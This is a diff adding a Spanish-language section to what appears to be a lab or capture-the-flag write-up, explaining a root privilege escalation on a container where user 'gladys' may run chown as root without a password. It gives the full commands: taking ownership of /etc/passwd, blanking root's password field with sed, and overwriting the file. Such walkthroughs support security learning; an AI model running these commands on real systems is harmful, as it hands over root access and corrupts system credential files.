@@ -145,3 +145,26 @@ Matching Defaults entries for gladys on 34882fa66e15:
 User gladys may run the following commands on 34882fa66e15:
     (root) NOPASSWD: /usr/bin/chown
 ```
+
+Para hacer esta escalada podemos hacerla de varias maneras , la forma mas sencilla es intentar editar el archivo `/etc/passwd`
+quitando para ello la comprobacion cuando se pide la contraseña del usuario root.
+
+Para ello tenemos que darle permiso al usuario gladys y posteriormente sobreescribir el archivo.
+
+```ruby
+sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
+```
+
+Luego con la herramienta `sed` eliminamos el caracter "x" que tiene en la linea root , creamos un archivo temporal en /tmp
+
+```ruby
+sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp
+```
+
+Por ultimo sobreescribimos el fichero `/etc/passwd`
+
+```ruby 
+cp /tmp/passwd.tmp /etc/passwd
+```
+
+![alt text](Imagenes/Anon_7.png)
